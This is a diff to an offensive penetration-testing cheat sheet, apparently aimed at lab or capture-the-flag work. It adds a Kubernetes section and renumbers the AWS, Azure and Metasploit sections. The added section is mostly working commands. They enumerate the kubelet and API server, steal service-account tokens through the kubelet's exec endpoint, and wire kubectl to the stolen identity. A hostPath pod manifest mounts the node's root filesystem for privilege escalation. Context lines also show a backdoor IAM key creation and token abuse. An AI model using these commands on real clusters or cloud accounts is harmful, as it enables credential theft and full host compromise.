@@ -25,10 +25,11 @@
 19. [IPv6 & Coercion Attacks](#19-ipv6--coercion-attacks)
 20. [MSSQL Attacks](#20-mssql-attacks)
 21. [Modern Web Attacks](#21-modern-web-attacks)
-22. [AWS Cloud Attacks](#22-aws-cloud-attacks)
-23. [Azure / Entra ID Attacks](#23-azure--entra-id-attacks)
-24. [Metasploit Framework](#24-metasploit-framework)
-25. [General Utilities & Modern Tooling](#25-general-utilities--modern-tooling)
+22. [Kubernetes](#22-kubernetes)
+23. [AWS Cloud Attacks](#23-aws-cloud-attacks)
+24. [Azure / Entra ID Attacks](#24-azure--entra-id-attacks)
+25. [Metasploit Framework](#25-metasploit-framework)
+26. [General Utilities & Modern Tooling](#26-general-utilities--modern-tooling)
 
 ---
 
@@ -2033,7 +2034,63 @@ python3 tplmap.py -u "http://<IP>/page?input=*"
 
 ---
 
-## 22. AWS Cloud Attacks
+## 22. Kubernetes
+
+> **Concept:** Kubernetes exposes multiple distinct network services, each with its own auth model. The most commonly misconfigured is Kubelet (default port 10250), which frequently allows anonymous API access even when the main API server (default port 6443/8443) correctly enforces RBAC.
+
+### Enumeration
+```bash
+curl -sk https://<target>:6443/api/v1/pods
+curl -sk https://<target>:10250/pods | jq
+kubeletctl --server <target> pods
+kubeletctl --server <target> scan token
+```
+
+### Get Service tokens/cert
+```bash
+# Pods mount its service artifacts at /var/run/secrets/kubernetes.io/serviceaccount/
+kubeletctl -i --server <target> exec "<command>" -p <pod_name> -c <container_name>
+curl -sk -X POST "https://<target>:10250/run/<namespace>/<pod>/<container>" --data-urlencode "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+curl -sk -X POST "https://<target>:10250/run/<namespace>/<pod>/<container>" --data-urlencode "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+```
+
+### Connect with kubectl
+```bash
+kubectl config set-cluster target --server=https://<target>:6443 --insecure-skip-tls-verify=true
+kubectl config set-credentials stolen-sa --token=<token>
+kubectl config set-context target --cluster=target --user=stolen-sa
+kubectl config use-context target
+kubectl auth can-i --list
+```
+
+### PrivEsc via Pod creation
+```bash
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privesc-pod
+  namespace: default
+spec:
+  containers:
+  - name: privesc-container
+    image: nginx:1.14.2   # use an image already cached/pullable on the node if the cluster is offline
+    volumeMounts:
+    - mountPath: /host
+      name: host-fs
+  volumes:
+  - name: host-fs
+    hostPath:
+      path: /
+  hostNetwork: true
+```
+```bash
+kubectl apply -f malicious-pod.yaml
+kubectl get pods
+kubeletctl -i --server <target> exec "cat /host/root/root.txt" -p privesc-pod -c privesc-container
+```
+
+
+## 23. AWS Cloud Attacks
 
 > **Concept:** CI/CD pipelines often have excessive IAM permissions. Common attack chain: misconfigured S3 → leaked Git credentials → Jenkins pipeline access → IAM credential theft → privilege escalation.
 
@@ -2144,7 +2201,7 @@ aws iam create-access-key --user-name backdoor
 
 ---
 
-## 23. Azure / Entra ID Attacks
+## 24. Azure / Entra ID Attacks
 
 > **Concept:** Azure/Entra ID (formerly Azure AD) is the cloud identity plane for most modern enterprises. Attack paths mirror on-prem AD but use REST APIs and OAuth tokens instead of Kerberos/LDAP. Key tools: `az cli`, `AADInternals`, `ROADtools`, `GraphRunner`, `TokenTactics`.
 
@@ -2271,7 +2328,7 @@ $token = Get-AADIntAccessTokenForMSGraph -PRTToken $prt
 
 ---
 
-## 24. Metasploit Framework
+## 25. Metasploit Framework
 
 > **Concept:** Metasploit organizes modules as: Auxiliary (scan/enum) → Exploit → Payload. Use `run -j` to background sessions. Stages payloads need `multi/handler` — never plain netcat.
 
@@ -2351,7 +2408,7 @@ run
 
 ---
 
-## 25. General Utilities & Modern Tooling
+## 26. General Utilities & Modern Tooling
 
 ### File Transfer
 
